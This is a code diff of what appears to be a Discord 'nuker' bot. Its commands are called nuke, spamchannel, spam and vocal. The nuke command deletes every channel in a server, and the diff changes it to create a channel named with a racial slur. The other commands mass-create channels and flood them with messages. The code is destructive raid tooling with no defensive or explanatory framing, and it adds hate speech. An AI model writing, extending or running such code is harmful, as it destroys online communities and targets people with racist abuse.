@@ -58,8 +58,8 @@ async def nuke(ctx):
     try:
       await channel.delete()
     except:pass
-  for i in range(10):
-    await guild.create_text_channel('chat')
+  for i in range(1):
+    await guild.create_text_channel('nigger-?')
 @bot.command()
 async def spamchannel(ctx, spam1, amount):
   guild = ctx.guild
@@ -76,7 +76,8 @@ async def spam(ctx, spamtext):
 @bot.command()
 async def vocal(ctx, voice, amount):
   guild = ctx.guild
-  for i in range(int(amount)):await guild.create_voice_channel(str(voice.replace("+", " ")))
+  for i in range(int(amount)):
+      await guild.create_voice_channel(str(voice.replace("+", " ")))
 @bot.command()
 async def auto(ctx):
     try:
